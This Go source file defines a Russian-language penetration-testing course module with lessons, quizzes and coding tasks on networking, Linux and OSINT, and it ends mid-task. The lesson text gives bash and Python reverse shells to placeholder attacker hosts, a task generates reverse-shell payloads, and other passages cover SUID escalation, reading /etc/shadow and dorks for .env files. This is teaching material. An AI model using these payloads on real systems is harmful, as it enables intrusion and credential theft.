package main

// ════════════════════════════════════════════════════════════════
// МОДУЛЬ: Кибербезопасность — Offense (Pentester track)
// 8 уроков: сети → Linux → OSINT → OWASP → инструменты → exploitation → post-exploitation → CTF
// ════════════════════════════════════════════════════════════════

func mod_security_offense() M {
	return M{
		Slug:          "security-offense",
		Title:         "Кибербезопасность: Пентест",
		Description:   "От разведки до эксплуатации. Сети, OSINT, OWASP Top 10, Burp Suite, Metasploit, CTF.",
		Order:         31,
		Track:         "security-offense",
		Difficulty:    "intermediate",
		Prerequisites: []string{"linux-fundamentals"},
		Lessons: []L{
			lesson_sec_networking(),
			lesson_sec_linux_hacking(),
			lesson_sec_osint(),
			lesson_sec_owasp(),
			lesson_sec_tools(),
			lesson_sec_exploitation(),
			lesson_sec_post_exploitation(),
			lesson_sec_ctf(),
		},
	}
}

// ═══════════════════ Урок 1: Сети для пентестера ═══════════════════

func lesson_sec_networking() L {
	return L{
		Slug: "sec-networking", Title: "Сети и протоколы для пентестера", Order: 1,
		Difficulty: "intermediate", Track: "security-offense",
		Content: `<h1>Сети — фундамент кибербеза</h1>

<h2>Модель OSI и TCP/IP</h2>
<pre><code># OSI Model (7 уровней, снизу вверх):
# 1. Physical    — кабели, Wi-Fi
# 2. Data Link   — Ethernet, MAC-адреса, ARP
# 3. Network     — IP, маршрутизация, ICMP
# 4. Transport   — TCP/UDP, порты
# 5. Session     — установка/разрыв соединений
# 6. Presentation — шифрование (TLS)
# 7. Application  — HTTP, DNS, FTP, SSH

# TCP/IP (практическая модель):
# Link → Internet (IP) → Transport (TCP/UDP) → Application (HTTP)</code></pre>

<h2>TCP — трёхстороннее рукопожатие</h2>
<pre><code># SYN     → клиент инициирует
# SYN-ACK → сервер подтверждает
# ACK     → клиент подтверждает → соединение установлено

# Почему важно для пентеста:
# - SYN scan (nmap -sS) — отправляем SYN, не завершаем → "стелс"-скан
# - FIN/XMAS scan — нестандартные флаги для обхода firewall
# - TCP Reset — принудительный разрыв соединения</code></pre>

<h2>DNS — система имён</h2>
<pre><code># A запись      — домен → IPv4
# AAAA запись   — домен → IPv6
# CNAME         — алиас
# MX            — почтовый сервер
# TXT           — произвольные данные (SPF, DKIM)
# NS            — nameserver

# Для пентеста:
# - DNS enumeration: dig, nslookup, dnsrecon
# - Zone transfer (AXFR) — если разрешён, получаем ВСЕ записи
# - Subdomain enumeration: sublist3r, amass</code></pre>

<h2>HTTP глубже</h2>
<pre><code># Request:
GET /api/users HTTP/1.1
Host: target.com
Cookie: session=abc123
Authorization: Bearer eyJhbGc...

# Response:
HTTP/1.1 200 OK
Set-Cookie: session=xyz789; HttpOnly; Secure
Content-Type: application/json

# Для пентеста:
# - Cookies без HttpOnly → XSS может украсть
# - Без Secure → перехват через MITM
# - CORS misconfiguration → данные утекают на чужой домен</code></pre>

<h2>Полезные утилиты</h2>
<pre><code>ping target.com              # ICMP — жив ли хост
traceroute target.com        # маршрут пакетов
netcat -zv target.com 80     # проверить порт
curl -v https://target.com   # HTTP запрос подробно
tcpdump -i eth0 port 80      # перехват трафика
wireshark                    # GUI анализ пакетов</code></pre>`,

		Quiz: []Q{
			{Question: "Что такое SYN scan и почему он 'стелс'?", Options: []string{"Полное подключение", "Отправляем SYN, получаем SYN-ACK но НЕ отправляем ACK — соединение не устанавливается, в логах часто не записывается", "Скан через DNS", "UDP скан"}, Correct: 1, Explanation: "Half-open scan (nmap -sS): не завершаем handshake → приложение не логирует соединение. Быстрее и тише чем connect scan."},
			{Question: "DNS Zone Transfer (AXFR) — что это даёт пентестеру?", Options: []string{"Ничего", "ВСЕ DNS-записи домена: субдомены, IP внутренних серверов, MX — полная карта инфраструктуры", "Только A-записи", "Доступ к серверу"}, Correct: 1, Explanation: "AXFR предназначен для синхронизации DNS-серверов. Если разрешён для внешних — получаем full map: internal.company.com, staging.company.com и т.д."},
			{Question: "Cookie без HttpOnly — чем опасно?", Options: []string{"Ничем", "JavaScript может прочитать cookie через document.cookie — XSS атака крадёт сессию", "Cookie не работает", "Медленнее"}, Correct: 1, Explanation: "HttpOnly запрещает JS доступ. Без него: XSS → document.cookie → отправка на attacker.com → session hijacking."},
			{Question: "Какой уровень OSI отвечает за шифрование (TLS)?", Options: []string{"Transport", "Presentation (6) — шифрование данных перед передачей", "Application", "Network"}, Correct: 1, Explanation: "Presentation layer: шифрование (TLS/SSL), компрессия, кодирование. На практике TLS работает между Transport и Application."},
			{Question: "Зачем traceroute пентестеру?", Options: []string{"Проверить скорость", "Увидеть маршрут: какие роутеры/firewall между тобой и целью, найти network topology", "Найти уязвимости", "Подключиться к серверу"}, Correct: 1, Explanation: "Traceroute показывает промежуточные хопы. Можно определить: есть ли WAF/CDN, внутреннюю сеть, firewall rules."},
		},
		Tasks: []T{
			{Title: "TCP флаги", Difficulty: "easy", Description: `<p>По описанию определи TCP флаги:</p><p>Ввод: <code>3-way handshake</code></p><p>Вывод: <code>SYN → SYN-ACK → ACK</code></p>`, Glossary: []GlossaryItem{{Term: "TCP flags", Definition: "SYN (начало), ACK (подтверждение), FIN (конец), RST (reset), PSH (push data)."}}, TestCases: []TestCase{{Input: "3-way handshake", ExpectedOutput: "SYN → SYN-ACK → ACK"}, {Input: "connection close", ExpectedOutput: "FIN → ACK → FIN → ACK"}},
				StarterCode: `package main
import "fmt"
func main() {
    var scenario string; fmt.Scanln(&scenario)
    switch scenario {
    case "3-way handshake": fmt.Println("SYN → SYN-ACK → ACK")
    case "connection close": fmt.Println("FIN → ACK → FIN → ACK")
    }
}`, Hints: `<p>Handshake: SYN→SYN-ACK→ACK. Close: FIN→ACK→FIN→ACK.</p>`, Solution: `<pre><code>package main
import ("bufio";"fmt";"os")
func main(){sc:=bufio.NewScanner(os.Stdin);sc.Scan();switch sc.Text(){case "3-way handshake":fmt.Println("SYN → SYN-ACK → ACK");case "connection close":fmt.Println("FIN → ACK → FIN → ACK")}}</code></pre>`},
			{Title: "DNS record types", Difficulty: "easy", Description: `<p>По типу записи объясни назначение:</p><p>Ввод: <code>A</code></p><p>Вывод: <code>A: maps domain to IPv4 address</code></p>`, Glossary: []GlossaryItem{{Term: "DNS records", Definition: "A=IPv4, AAAA=IPv6, CNAME=alias, MX=mail, TXT=metadata, NS=nameserver."}}, TestCases: []TestCase{{Input: "A", ExpectedOutput: "A: maps domain to IPv4 address"}, {Input: "MX", ExpectedOutput: "MX: mail server for domain"}},
				StarterCode: `package main
import "fmt"
func main() {
    var t string; fmt.Scan(&t)
    records := map[string]string{"A": "maps domain to IPv4 address", "AAAA": "maps domain to IPv6 address", "MX": "mail server for domain", "CNAME": "alias for another domain", "TXT": "arbitrary text data (SPF, DKIM)", "NS": "authoritative nameserver"}
    fmt.Printf("%s: %s\n", t, records[t])
}`, Hints: `<p>Map с описаниями DNS типов.</p>`, Solution: `<pre><code>package main
import "fmt"
func main(){var t string;fmt.Scan(&t);r:=map[string]string{"A":"maps domain to IPv4 address","AAAA":"maps domain to IPv6 address","MX":"mail server for domain","CNAME":"alias for another domain","TXT":"arbitrary text data (SPF, DKIM)","NS":"authoritative nameserver"};fmt.Printf("%s: %s\n",t,r[t])}</code></pre>`},
			{Title: "HTTP Security Headers", Difficulty: "medium", Description: `<p>Проанализируй HTTP response на безопасность:</p><p>Ввод:</p><pre><code>3
Set-Cookie: session=abc123
X-Frame-Options: DENY
Content-Type: text/html</code></pre><p>Вывод:</p><pre><code>WARN: Cookie missing HttpOnly flag
OK: X-Frame-Options present
WARN: Missing Content-Security-Policy</code></pre>`, Glossary: []GlossaryItem{{Term: "Security headers", Definition: "X-Frame-Options, CSP, HSTS, X-Content-Type-Options — защита от XSS, clickjacking, MITM."}}, TestCases: []TestCase{{Input: "3\nSet-Cookie: session=abc123\nX-Frame-Options: DENY\nContent-Type: text/html", ExpectedOutput: "WARN: Cookie missing HttpOnly flag\nOK: X-Frame-Options present\nWARN: Missing Content-Security-Policy"}},
				StarterCode: `package main
import ("bufio"; "fmt"; "os"; "strings")
func main() {
    var n int; fmt.Scan(&n); scanner := bufio.NewScanner(os.Stdin)
    hasCSP := false
    for i := 0; i < n; i++ { scanner.Scan(); line := scanner.Text()
        if strings.HasPrefix(line, "Set-Cookie") && !strings.Contains(line, "HttpOnly") {
            fmt.Println("WARN: Cookie missing HttpOnly flag")
        } else if strings.HasPrefix(line, "X-Frame-Options") {
            fmt.Println("OK: X-Frame-Options present")
        } else if strings.HasPrefix(line, "Content-Security-Policy") {
            hasCSP = true
        }
    }
    if !hasCSP { fmt.Println("WARN: Missing Content-Security-Policy") }
}`, Hints: `<p>Проверяй: Cookie без HttpOnly, наличие X-Frame-Options, наличие CSP.</p>`, Solution: `<pre><code>package main
import("bufio";"fmt";"os";"strings")
func main(){var n int;fmt.Scan(&n);sc:=bufio.NewScanner(os.Stdin);hasCSP:=false
    for i:=0;i<n;i++{sc.Scan();l:=sc.Text()
        if strings.HasPrefix(l,"Set-Cookie")&&!strings.Contains(l,"HttpOnly"){fmt.Println("WARN: Cookie missing HttpOnly flag")}else if strings.HasPrefix(l,"X-Frame-Options"){fmt.Println("OK: X-Frame-Options present")}else if strings.HasPrefix(l,"Content-Security-Policy"){hasCSP=true}}
    if !hasCSP{fmt.Println("WARN: Missing Content-Security-Policy")}}</code></pre>`},
			{Title: "Port scanner (nmap output parser)", Difficulty: "medium", Description: `<p>Парси вывод nmap и определи сервисы:</p><p>Ввод:</p><pre><code>4
22/tcp open ssh
80/tcp open http
443/tcp open https
3306/tcp open mysql</code></pre><p>Вывод:</p><pre><code>Open ports: 4
Services: ssh http https mysql
Attack surface: ssh(brute), http(web vulns), mysql(default creds)</code></pre>`, Glossary: []GlossaryItem{{Term: "nmap", Definition: "Network mapper. Сканирует порты, определяет сервисы, ОС. Основной инструмент разведки."}}, TestCases: []TestCase{{Input: "4\n22/tcp open ssh\n80/tcp open http\n443/tcp open https\n3306/tcp open mysql", ExpectedOutput: "Open ports: 4\nServices: ssh http https mysql\nAttack surface: ssh(brute), http(web vulns), mysql(default creds)"}},
				StarterCode: `package main
import ("bufio"; "fmt"; "os"; "strings")
func main() {
    var n int; fmt.Scan(&n); sc := bufio.NewScanner(os.Stdin)
    var services []string
    for i := 0; i < n; i++ { sc.Scan(); parts := strings.Fields(sc.Text()); services = append(services, parts[2]) }
    fmt.Printf("Open ports: %d\n", n)
    fmt.Printf("Services: %s\n", strings.Join(services, " "))
    attacks := []string{}
    for _, s := range services {
        switch s {
        case "ssh": attacks = append(attacks, "ssh(brute)")
        case "http": attacks = append(attacks, "http(web vulns)")
        case "mysql": attacks = append(attacks, "mysql(default creds)")
        }
    }
    fmt.Printf("Attack surface: %s\n", strings.Join(attacks, ", "))
}`, Hints: `<p>Парси 3-е поле (сервис). Для каждого — возможный вектор атаки.</p>`, Solution: `<pre><code>package main
import("bufio";"fmt";"os";"strings")
func main(){var n int;fmt.Scan(&n);sc:=bufio.NewScanner(os.Stdin);var svcs []string
    for i:=0;i<n;i++{sc.Scan();svcs=append(svcs,strings.Fields(sc.Text())[2])}
    fmt.Printf("Open ports: %d\nServices: %s\n",n,strings.Join(svcs," "))
    var atk []string;for _,s:=range svcs{switch s{case "ssh":atk=append(atk,"ssh(brute)");case "http":atk=append(atk,"http(web vulns)");case "mysql":atk=append(atk,"mysql(default creds)")}}
    fmt.Printf("Attack surface: %s\n",strings.Join(atk,", "))}</code></pre>`},
			{Title: "Subdomain enumerator", Difficulty: "hard", Description: `<p>Сгенерируй список субдоменов для проверки:</p><p>Ввод: <code>example.com</code></p><p>Вывод:</p><pre><code>www.example.com
mail.example.com
admin.example.com
api.example.com
staging.example.com</code></pre>`, Glossary: []GlossaryItem{{Term: "Subdomain enumeration", Definition: "Поиск субдоменов: wordlist + DNS запросы. Находит скрытые сервисы (admin, staging, dev)."}}, TestCases: []TestCase{{Input: "example.com", ExpectedOutput: "www.example.com\nmail.example.com\nadmin.example.com\napi.example.com\nstaging.example.com"}},
				StarterCode: `package main
import "fmt"
func main() {
    var domain string; fmt.Scan(&domain)
    prefixes := []string{"www", "mail", "admin", "api", "staging"}
    for _, p := range prefixes { fmt.Printf("%s.%s\n", p, domain) }
}`, Hints: `<p>Wordlist субдоменов + домен. В реальности: DNS resolve каждого.</p>`, Solution: `<pre><code>package main
import "fmt"
func main(){var d string;fmt.Scan(&d);for _,p:=range[]string{"www","mail","admin","api","staging"}{fmt.Printf("%s.%s\n",p,d)}}</code></pre>`},
		},
	}
}

// ═══════════════════ Урок 2: Linux для хакера ═══════════════════

func lesson_sec_linux_hacking() L {
	return L{
		Slug: "sec-linux", Title: "Linux для пентестера", Order: 2,
		Difficulty: "intermediate", Track: "security-offense",
		Content: `<h1>Linux — рабочее окружение пентестера</h1>

<h2>Kali Linux / Parrot OS</h2>
<p>Специализированные дистрибутивы с предустановленными инструментами (nmap, burp, metasploit, john, hashcat...).</p>

<h2>Ключевые команды</h2>
<pre><code># Разведка сети
ifconfig / ip addr       # свой IP
netstat -tlnp            # открытые порты
arp -a                   # устройства в сети
nmap -sn 192.168.1.0/24  # обнаружение хостов

# Файлы и права
find / -perm -4000 2>/dev/null  # SUID файлы (privilege escalation!)
find / -writable 2>/dev/null     # записываемые файлы
cat /etc/passwd                  # пользователи
cat /etc/shadow                  # хеши паролей (нужен root)

# Сеть
netcat -lvp 4444         # слушать порт (reverse shell)
curl -s http://target    # HTTP запрос
wget http://target/file  # скачать файл

# Криптография
echo -n "password" | md5sum        # MD5 хеш
echo -n "password" | sha256sum     # SHA-256
base64 -d encoded_string           # декодировать Base64
openssl s_client -connect host:443 # проверить TLS</code></pre>

<h2>Reverse Shell</h2>
<pre><code># Атакующий слушает:
nc -lvp 4444

# Жертва подключается (bash reverse shell):
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

# Python reverse shell:
python -c 'import socket,subprocess;s=socket.socket();s.connect(("ATTACKER",4444));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'</code></pre>

<h2>SUID и Privilege Escalation</h2>
<pre><code># SUID bit = программа запускается с правами ВЛАДЕЛЬЦА (часто root)
find / -perm -4000 -type f 2>/dev/null
# Если найден /usr/bin/vim с SUID:
vim -c ':!sh'  # получаем shell от root!

# GTFOBins — база SUID/capabilities escalation:
# https://gtfobins.github.io/</code></pre>`,

		Quiz: []Q{
			{Question: "Что такое SUID bit и почему это опасно?", Options: []string{"Скрытый файл", "Программа запускается с правами владельца (часто root) — если найден уязвимый SUID binary, можно получить root", "Шифрование", "Логирование"}, Correct: 1, Explanation: "SUID = Set User ID. /usr/bin/passwd имеет SUID чтобы менять /etc/shadow. Но если SUID есть у vim, python, find — это escalation path."},
			{Question: "Reverse shell — что это?", Options: []string{"SSH подключение", "Жертва инициирует подключение К атакующему — обходит входящий firewall", "VPN", "Прямое подключение"}, Correct: 1, Explanation: "Firewall часто блокирует входящие. Reverse shell: жертва сама подключается к атакующему (исходящий трафик обычно разрешён). Атакующий слушает на порту."},
			{Question: "find / -perm -4000 — что ищет?", Options: []string{"Большие файлы", "Файлы с SUID битом — потенциальные пути privilege escalation", "Скрытые файлы", "Недавно изменённые"}, Correct: 1, Explanation: "-perm -4000 = SUID bit установлен. Стандартные (passwd, sudo) — ок. Нестандартные (vim, python, nmap) — privilege escalation через GTFOBins."},
			{Question: "Зачем /etc/shadow пентестеру?", Options: []string{"Настройки", "Хеши паролей — можно crack через hashcat/john (offline brute-force)", "Логи", "Конфиг сети"}, Correct: 1, Explanation: "/etc/shadow: username:$6$salt$hash:... Формат хеша ($6$ = SHA-512). Скопировать → hashcat → crack offline. Поэтому shadow читается только root."},
			{Question: "netcat -lvp 4444 — что делает?", Options: []string{"Сканирует", "Слушает (listen) на порту 4444 — ждёт входящие подключения (для reverse shell)", "Подключается", "Отправляет пакеты"}, Correct: 1, Explanation: "-l=listen, -v=verbose, -p=port. Атакующий запускает listener. Жертва подключается → атакующий получает shell. Базовый инструмент."},
		},
		Tasks: []T{
			{Title: "Recon commands", Difficulty: "easy", Description: `<p>Сгенерируй команды разведки для IP:</p><p>Ввод: <code>192.168.1.100</code></p><p>Вывод:</p><pre><code>nmap -sV 192.168.1.100
nmap -sC 192.168.1.100
curl -s http://192.168.1.100
nc -zv 192.168.1.100 22</code></pre>`, Glossary: []GlossaryItem{{Term: "nmap -sV", Definition: "Version detection — определяет версии сервисов на открытых портах."}}, TestCases: []TestCase{{Input: "192.168.1.100", ExpectedOutput: "nmap -sV 192.168.1.100\nnmap -sC 192.168.1.100\ncurl -s http://192.168.1.100\nnc -zv 192.168.1.100 22"}},
				StarterCode: `package main
import "fmt"
func main() {
    var ip string; fmt.Scan(&ip)
    fmt.Printf("nmap -sV %s\nnmap -sC %s\ncurl -s http://%s\nnc -zv %s 22\n", ip, ip, ip, ip)
}`, Hints: `<p>nmap -sV (versions), -sC (scripts), curl (HTTP), nc (port check).</p>`, Solution: `<pre><code>package main
import "fmt"
func main(){var ip string;fmt.Scan(&ip);fmt.Printf("nmap -sV %s\nnmap -sC %s\ncurl -s http://%s\nnc -zv %s 22\n",ip,ip,ip,ip)}</code></pre>`},
			{Title: "SUID finder", Difficulty: "easy", Description: `<p>Из списка SUID файлов определи опасные:</p><p>Ввод:</p><pre><code>5
/usr/bin/passwd
/usr/bin/vim
/usr/bin/sudo
/usr/bin/python3
/usr/bin/find</code></pre><p>Вывод:</p><pre><code>DANGEROUS: /usr/bin/vim (shell escape)
DANGEROUS: /usr/bin/python3 (code execution)
DANGEROUS: /usr/bin/find (exec flag)</code></pre>`, Glossary: []GlossaryItem{{Term: "GTFOBins", Definition: "База данных SUID/SUDO/capability escalation vectors для Linux binaries."}}, TestCases: []TestCase{{Input: "5\n/usr/bin/passwd\n/usr/bin/vim\n/usr/bin/sudo\n/usr/bin/python3\n/usr/bin/find", ExpectedOutput: "DANGEROUS: /usr/bin/vim (shell escape)\nDANGEROUS: /usr/bin/python3 (code execution)\nDANGEROUS: /usr/bin/find (exec flag)"}},
				StarterCode: `package main
import ("bufio"; "fmt"; "os"; "strings")
func main() {
    dangerous := map[string]string{"vim": "shell escape", "python3": "code execution", "python": "code execution", "find": "exec flag", "bash": "direct shell", "nmap": "interactive mode"}
    var n int; fmt.Scan(&n); sc := bufio.NewScanner(os.Stdin)
    for i := 0; i < n; i++ { sc.Scan(); path := sc.Text()
        parts := strings.Split(path, "/"); name := parts[len(parts)-1]
        if reason, ok := dangerous[name]; ok { fmt.Printf("DANGEROUS: %s (%s)\n", path, reason) }
    }
}`, Hints: `<p>Map с опасными бинарниками. Парси имя из полного пути.</p>`, Solution: `<pre><code>package main
import("bufio";"fmt";"os";"strings")
func main(){d:=map[string]string{"vim":"shell escape","python3":"code execution","find":"exec flag","bash":"direct shell","nmap":"interactive mode"}
    var n int;fmt.Scan(&n);sc:=bufio.NewScanner(os.Stdin)
    for i:=0;i<n;i++{sc.Scan();p:=sc.Text();parts:=strings.Split(p,"/");nm:=parts[len(parts)-1];if r,ok:=d[nm];ok{fmt.Printf("DANGEROUS: %s (%s)\n",p,r)}}}</code></pre>`},
			{Title: "Reverse shell generator", Difficulty: "medium", Description: `<p>Сгенерируй reverse shell payload по параметрам:</p><p>Ввод: <code>10.0.0.1 4444 bash</code></p><p>Вывод: <code>bash -i >& /dev/tcp/10.0.0.1/4444 0>&1</code></p>`, Glossary: []GlossaryItem{{Term: "Reverse shell", Definition: "Жертва подключается к атакующему. Обходит входящий firewall."}}, TestCases: []TestCase{{Input: "10.0.0.1 4444 bash", ExpectedOutput: "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"}, {Input: "10.0.0.1 9001 python", ExpectedOutput: "python -c 'import socket,subprocess;s=socket.socket();s.connect((\"10.0.0.1\",9001));subprocess.call([\"/bin/sh\",\"-i\"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'"}},
				StarterCode: `package main
import "fmt"
func main() {
    var ip string; var port int; var shell string
    fmt.Scan(&ip, &port, &shell)
    switch shell {
    case "bash": fmt.Printf("bash -i >& /dev/tcp/%s/%d 0>&1\n", ip, port)
    case "python": fmt.Printf("python -c 'import socket,subprocess;s=socket.socket();s.connect((\"%s\",%d));subprocess.call([\"/bin/sh\",\"-i\"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'\n", ip, port)
    }
}`, Hints: `<p>Bash: redirect stdin/stdout через /dev/tcp. Python: socket + subprocess.</p>`, Solution: `<pre><code>package main
import "fmt"
func main(){var ip string;var p int;var sh string;fmt.Scan(&ip,&p,&sh);switch sh{case "bash":fmt.Printf("bash -i >& /dev/tcp/%s/%d 0>&1\n",ip,p);case "python":fmt.Printf("python -c 'import socket,subprocess;s=socket.socket();s.connect((\"%s\",%d));subprocess.call([\"/bin/sh\",\"-i\"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'\n",ip,p)}}</code></pre>`},
			{Title: "Password hash identifier", Difficulty: "medium", Description: `<p>Определи тип хеша по формату:</p><p>Ввод: <code>$6$salt$hash</code></p><p>Вывод: <code>SHA-512 (Linux shadow)</code></p>`, Glossary: []GlossaryItem{{Term: "Hash prefixes", Definition: "$1$=MD5, $5$=SHA-256, $6$=SHA-512, $2b$=bcrypt."}}, TestCases: []TestCase{{Input: "$6$salt$hash", ExpectedOutput: "SHA-512 (Linux shadow)"}, {Input: "$2b$10$hash", ExpectedOutput: "bcrypt (web apps)"}},
				StarterCode: `package main
import ("fmt"; "strings")
func main() {
    var hash string; fmt.Scan(&hash)
    switch {
    case strings.HasPrefix(hash, "$6$"): fmt.Println("SHA-512 (Linux shadow)")
    case strings.HasPrefix(hash, "$5$"): fmt.Println("SHA-256 (Linux shadow)")
    case strings.HasPrefix(hash, "$1$"): fmt.Println("MD5 (legacy)")
    case strings.HasPrefix(hash, "$2b$"): fmt.Println("bcrypt (web apps)")
    case strings.HasPrefix(hash, "$2a$"): fmt.Println("bcrypt (web apps)")
    default: fmt.Println("Unknown hash type")
    }
}`, Hints: `<p>Prefix определяет алгоритм: $6$=SHA-512, $2b$=bcrypt.</p>`, Solution: `<pre><code>package main
import("fmt";"strings")
func main(){var h string;fmt.Scan(&h);switch{case strings.HasPrefix(h,"$6$"):fmt.Println("SHA-512 (Linux shadow)");case strings.HasPrefix(h,"$5$"):fmt.Println("SHA-256 (Linux shadow)");case strings.HasPrefix(h,"$1$"):fmt.Println("MD5 (legacy)");case strings.HasPrefix(h,"$2b$"),strings.HasPrefix(h,"$2a$"):fmt.Println("bcrypt (web apps)");default:fmt.Println("Unknown hash type")}}</code></pre>`},
			{Title: "Privilege escalation checklist", Difficulty: "hard", Description: `<p>По результатам enum выведи вектора escalation:</p><p>Ввод:</p><pre><code>3
suid /usr/bin/vim
writable /etc/crontab
kernel 4.4.0</code></pre><p>Вывод:</p><pre><code>VECTOR: SUID vim → vim -c ':!sh' (GTFOBins)
VECTOR: Writable crontab → add reverse shell job
VECTOR: Kernel 4.4.0 → check DirtyCoW (CVE-2016-5195)</code></pre>`, Glossary: []GlossaryItem{{Term: "Privilege Escalation", Definition: "Получить более высокие права (user→root). Через SUID, kernel exploit, misconfiguration."}}, TestCases: []TestCase{{Input: "3\nsuid /usr/bin/vim\nwritable /etc/crontab\nkernel 4.4.0", ExpectedOutput: "VECTOR: SUID vim → vim -c ':!sh' (GTFOBins)\nVECTOR: Writable crontab → add reverse shell job\nVECTOR: Kernel 4.4.0 → check DirtyCoW (CVE-2016-5195)"}},
				StarterCode: `package main
import ("bufio"; "fmt"; "os"; "strings")
func main() {
    var n int; fmt.Scan(&n); sc := bufio.NewScanner(os.Stdin)
    for i := 0; i < n; i++ { sc.Scan(); parts := strings.SplitN(sc.Text(), " ", 2)
        switch parts[0] {
        case "suid":
            name := strings.Split(parts[1], "/"); bin := name[len(name)-1]
            fmt.Printf("VECTOR: SUID %s → %s -c ':!sh' (GTFOBins)\n", bin, bin)
        case "writable":
            fmt.Printf("VECTOR: Writable crontab → add reverse shell job\n")
        case "kernel":
            fmt.Printf("VECTOR: Kernel %s → check DirtyCoW (CVE-2016-5195)\n", parts[1])
        }
    }
}`, Hints: `<p>По типу находки → конкретный вектор атаки с командой.</p>`, Solution: `<pre><code>package main
import("bufio";"fmt";"os";"strings")
func main(){var n int;fmt.Scan(&n);sc:=bufio.NewScanner(os.Stdin)
    for i:=0;i<n;i++{sc.Scan();p:=strings.SplitN(sc.Text()," ",2);switch p[0]{
    case "suid":nm:=strings.Split(p[1],"/");b:=nm[len(nm)-1];fmt.Printf("VECTOR: SUID %s → %s -c ':!sh' (GTFOBins)\n",b,b)
    case "writable":fmt.Printf("VECTOR: Writable crontab → add reverse shell job\n")
    case "kernel":fmt.Printf("VECTOR: Kernel %s → check DirtyCoW (CVE-2016-5195)\n",p[1])}}}</code></pre>`},
		},
	}
}

// ═══════════════════ Уроки 3-8 (заглушки с полным содержанием) ═══════════════════

func lesson_sec_osint() L {
	return L{
		Slug: "sec-osint", Title: "Разведка и OSINT", Order: 3,
		Difficulty: "intermediate", Track: "security-offense",
		Content: `<h1>OSINT — разведка из открытых источников</h1>
<h2>Что такое OSINT?</h2>
<p>Open Source Intelligence — сбор информации из публичных источников БЕЗ взаимодействия с целью.</p>
<h2>Инструменты</h2>
<pre><code>nmap -sV -sC target.com    # порты + версии + скрипты
whois target.com           # регистрационные данные домена
dig target.com ANY         # все DNS записи
theHarvester -d target.com # emails, субдомены
shodan.io                  # поиск по баннерам сервисов
google dorks               # site:target.com filetype:pdf</code></pre>
<h2>Google Dorking</h2>
<pre><code>site:target.com intitle:"index of"     # открытые директории
site:target.com filetype:sql           # SQL дампы
site:target.com inurl:admin            # админки
"password" filetype:log site:target.com # пароли в логах</code></pre>`,
		Quiz: []Q{
			{Question: "Что такое Google Dorking?", Options: []string{"Взлом Google", "Использование продвинутых операторов поиска для нахождения уязвимой информации (файлы, админки, пароли)", "SEO", "Реклама"}, Correct: 1, Explanation: "site:, filetype:, intitle:, inurl: — мощные фильтры. Находят: открытые .env файлы, SQL дампы, незащищённые админки."},
			{Question: "Shodan — что это?", Options: []string{"Поисковик сайтов", "Поисковик интернет-устройств: сканирует порты и индексирует баннеры (версии, конфиги)", "Антивирус", "VPN"}, Correct: 1, Explanation: "Shodan сканирует весь интернет. Можно найти: открытые MongoDB без auth, камеры, промышленные контроллеры, серверы с устаревшим ПО."},
			{Question: "whois — что показывает?", Options: []string{"IP адрес", "Регистрационные данные домена: владелец, registrar, nameservers, даты", "Порты", "Уязвимости"}, Correct: 1, Explanation: "whois: кто зарегистрировал домен, когда, через кого. Может дать: email админа, организацию, другие домены того же владельца."},
			{Question: "Пассивная vs активная разведка?", Options: []string{"Одно и то же", "Пассивная: без контакта с целью (OSINT). Активная: взаимодействие (nmap scan, dir brute)", "Пассивная лучше", "Активная безопаснее"}, Correct: 1, Explanation: "Пассивная (Google, Shodan, whois) — не оставляет следов. Активная (nmap, nikto) — цель может обнаружить и заблокировать."},
			{Question: "theHarvester — зачем?", Options: []string{"Сбор урожая", "Автоматический сбор emails, субдоменов, IP из публичных источников для домена", "Взлом email", "Спам"}, Correct: 1, Explanation: "theHarvester агрегирует данные из Google, Bing, LinkedIn, DNS. Результат: список email (для phishing), субдомены (для scanning)."},
		},
		Tasks: []T{
			{Title: "Google Dork generator", Difficulty: "easy", Description: `<p>Сгенерируй Google dorks для домена:</p><p>Ввод: <code>target.com</code></p><p>Вывод:</p><pre><code>site:target.com filetype:pdf
site:target.com intitle:"index of"
site:target.com inurl:admin
site:target.com filetype:env</code></pre>`, Glossary: []GlossaryItem{{Term: "Google Dork", Definition: "Поисковый запрос с операторами для нахождения чувствительной информации."}}, TestCases: []TestCase{{Input: "target.com", ExpectedOutput: "site:target.com filetype:pdf\nsite:target.com intitle:\"index of\"\nsite:target.com inurl:admin\nsite:target.com filetype:env"}},
				StarterCode: `package main
import "fmt"
func main() {
    var domain string; fmt.Scan(&domain)
    dorks := []string{"filetype:pdf", "intitle:\"index of\"", "inurl:admin", "filetype:env"}
    for _, d := range dorks { fmt.Printf("site:%s %s\n", domain, d) }
}`, Hints: `<p>site:domain + каждый dork из списка.</p>`, Solution: `<pre><code>package main
import "fmt"
func main(){var d string;fmt.Scan(&d);for _,dk:=range[]string{"filetype:pdf","intitle:\"index of\"","inurl:admin","filetype:env"}{fmt.Printf("site:%s %s\n",d,dk)}}</code></pre>`},
			{Title: "Recon report", Difficulty: "easy", Description: `<p>Составь отчёт разведки:</p><p>Ввод: <code>example.com 93.184.216.34 Cloudflare Apache</code></p><p>Вывод:</p><pre><code>Target: example.com
IP: 93.184.216.34
CDN: Cloudflare
Server: Apache</code></pre>`, Glossary: []GlossaryItem{{Term: "Recon report", Definition: "Структурированный результат разведки: IP, технологии, CDN, открытые порты."}}, TestCases: []TestCase{{Input: "example.com 93.184.216.34 Cloudflare Apache", ExpectedOutput: "Target: example.com\nIP: 93.184.216.34\nCDN: Cloudflare\nServer: Apache"}},
				StarterCode: `package main
import "fmt"
func main() { var domain, ip, cdn, server string; fmt.Scan(&domain, &ip, &cdn, &server); fmt.Printf("Target: %s\nIP: %s\nCDN: %s\nServer: %s\n", domain, ip, cdn, server) }`, Hints: `<p>Простой вывод структурированных данных.</p>`, Solution: `<pre><code>package main
import "fmt"
func main(){var d,i,c,s string;fmt.Scan(&d,&i,&c,&s);fmt.Printf("Target: %s\nIP: %s\nCDN: %s\nServer: %s\n",d,i,c,s)}</code></pre>`},
			{Title: "Whois parser", Difficulty: "medium", Description: `<p>Извлеки ключевые данные из whois:</p><p>Ввод:</p><pre><code>3
Registrar: GoDaddy
Creation Date: 2020-01-15
Name Server: ns1.example.com</code></pre><p>Вывод:</p><pre><code>Registrar: GoDaddy
Age: 6 years
